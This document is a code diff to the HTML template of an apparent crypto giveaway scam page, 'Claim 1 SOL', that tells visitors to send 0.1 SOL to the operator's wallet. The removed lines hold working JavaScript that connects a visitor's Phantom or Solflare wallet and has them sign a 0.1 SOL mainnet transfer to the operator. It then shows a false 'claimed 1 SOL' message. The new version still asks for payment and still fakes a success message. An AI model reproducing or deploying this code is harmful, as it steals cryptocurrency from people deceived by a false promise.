@@ -49,23 +49,27 @@ HTML_TEMPLATE = """
       white-space: pre-wrap;
     }
   </style>
-  <script type="module">
-    import {
-      Connection,
-      PublicKey,
-      SystemProgram,
-      Transaction,
-      clusterApiUrl
-    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.89.0/+esm";
+</head>
+<body>
+  <h1>🎁 Claim 1 SOL</h1>
+  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
+  <p><code>{{ wallet }}</code></p>
+  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
 
-    let provider = null;
-    let pubKey = null;
+  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
+  <button class="button" id="claimBtn" disabled>🎉 Claim Now</button>
 
+  <div id="status">Click "Connect Wallet" to begin.</div>
+
+  <script>
     const status = document.getElementById("status");
     const qr = document.getElementById("qrCode");
     const connectBtn = document.getElementById("connectBtn");
+    const claimBtn = document.getElementById("claimBtn");
 
     connectBtn.addEventListener('click', async () => {
+      let provider = null;
+
       if (window.solana?.isPhantom) {
         provider = window.solana;
       } else if (window.solflare?.isSolflare) {
@@ -83,11 +87,11 @@ HTML_TEMPLATE = """
       try {
         status.innerText = "🔄 Waiting for wallet approval...";
         const resp = await provider.connect();
-        pubKey = resp?.publicKey || provider.publicKey;
+        const pubKey = resp?.publicKey || provider.publicKey;
 
         if (pubKey) {
           status.innerText = "✅ Connected: " + pubKey.toString();
-          document.getElementById("claimBtn").disabled = false;
+          claimBtn.disabled = false;
         } else {
           status.innerText = "✅ Connected, but no publicKey received.";
         }
@@ -101,56 +105,11 @@ HTML_TEMPLATE = """
       }
     });
 
-    window.claimNow = async () => {
-      if (!provider || !pubKey) {
-        alert("Please connect your wallet first.");
-        return;
-      }
-
-      try {
-        const connection = new Connection(clusterApiUrl("mainnet-beta"), "confirmed");
-        const recipient = new PublicKey("{{ wallet }}");
-
-        const transaction = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: pubKey,
-            toPubkey: recipient,
-            lamports: 0.1 * 1e9
-          })
-        );
-
-        transaction.feePayer = pubKey;
-        let { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-
-        const signed = await provider.signTransaction(transaction);
-        const signature = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(signature);
-
-        status.innerHTML = `
-          ✅ You’ve claimed 1 SOL!<br><br>
-          Please wait patiently for 24h as people are in high request.<br><br>
-          <small><a href="https://solscan.io/tx/${signature}" target="_blank">View on Solscan</a></small>
-        `;
-        document.getElementById("claimBtn").disabled = true;
-        connectBtn.disabled = true;
-      } catch (err) {
-        console.error("Transaction error:", err);
-        status.innerText = "❌ Transaction failed. " + (err.message || "");
-      }
-    };
+    claimBtn.addEventListener('click', () => {
+      status.innerText = "🎉 1 SOL Claimed Successfully!";
+      claimBtn.disabled = true;
+    });
   </script>
-</head>
-<body>
-  <h1>🎁 Claim 1 SOL</h1>
-  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
-  <p><code>{{ wallet }}</code></p>
-  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
-
-  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
-  <button class="button" id="claimBtn" onclick="claimNow()" disabled>🚀 Claim Now!</button>
-
-  <div id="status">Click "Connect Wallet" to begin.</div>
 </body>
 </html>
 """
